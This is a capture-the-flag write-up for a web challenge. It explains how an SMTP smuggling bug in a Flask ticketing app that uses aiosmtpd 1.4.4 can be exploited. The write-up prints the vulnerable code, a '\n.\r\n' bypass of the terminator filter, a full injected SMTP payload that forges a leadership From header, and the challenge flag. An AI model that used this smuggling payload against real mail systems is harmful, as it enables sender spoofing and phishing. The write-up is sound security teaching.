# Supermassive Black Hole

## Challenge Summary

- **Category**: Web
- **Points**: 50
- **Solves**: 100 teams

---

### Problem Description

> Black Hole Ticketing Services prides itself on losing tickets at the speed of light. Can you get them to escalate?

---

## Challenge Structure

- The challenge consists of a Flask-based web application and a local SMTP server using `aiosmtpd 1.4.4`
- When a user submits a support ticket, the server sends an email to an internal address via SMTP
- The IT bot only escalates tickets (i.e., returns the flag) if the email appears to come from `leadership@blackholeticketing.com`
- This leadership email is not hardcoded in the backend, but can be found in the `/about` page HTML

---

## Exploitation Flow

### Step 1: Identifying the SMTP Smuggling Point

The web server constructs an email using user-supplied input (`message`) like this:

```python
message_data = f"""\
From: support@blackholeticketing.com\r\n\
To: it@blackholeticketing.com\r\n\
Subject: {subject}\r\n\
X-Ticket-ID: {ticket_id}\r\n\
\r\n\
{message}\r\n\
.\r\n""".encode()
```

Before sending, the following validation is applied:

```python
ending_count = message_data.count(b'\r\n.\r\n')
if ending_count != 1:
    raise ValueError("Bad Request")
```

This filters out payloads containing more than one SMTP message terminator (`\r\n.\r\n`) and aims to prevent SMTP smuggling. However, the filter is not sufficient.

---

### Step 2: Bypassing the Filter Using `\n.\r\n`

While `\r\n.\r\n` is blocked by the filter, inserting `\n.\r\n` bypasses it.

- The filter only counts exact `\r\n.\r\n` sequences
- The vulnerable `aiosmtpd 1.4.4` server misinterprets `\n.\r\n` as a valid message terminator
- This causes the first message to terminate early, allowing arbitrary SMTP commands to be injected afterward

---

### Step 3: Understanding the Flag Conditions

The IT bot in `smtp_server.py` processes emails and responds based on the `From` header:

```python
if internal.leadership_email in from_header.lower():
    response = "C-Suite ticket received! Will escalate immediately!" + f"\n{internal.flag}"
```

Thus, the flag is only returned if the message comes from `leadership@blackholeticketing.com`.
That email address is discoverable in the `/about` page:

```html
contact our leadership at <span class="email">leadership@blackholeticketing.com</span>
```

---

### Step 4: Crafting and Sending the Payload

Using the bypassed SMTP smuggling vector, we inject a second email message with a forged `From` header:

```
A\n.\r\n
MAIL FROM:<leadership@blackholeticketing.com>\r\n
RCPT TO:<it@blackholeticketing.com>\r\n
DATA\r\n
From: leadership@blackholeticketing.com\r\n
To: it@blackholeticketing.com\r\n
Subject: escalation\r\n
X-Ticket-ID: A\r\n
\r\n
please escalate
```

Explanation:

1. The message is terminated early by `\n.\r\n`
2. The remaining lines are interpreted as new SMTP commands
3. A new message is delivered with the `From` header spoofed to `leadership@...`
4. The IT bot sees the forged message and returns a response containing the flag

The flag can then be retrieved from the endpoint: `/check_response/A`

---

## Flag

```text
C-Suite ticket received! Will escalate immediately!
uiuctf{7h15_c0uld_h4v3_b33n_4_5l4ck_m355463_8091732490}
```
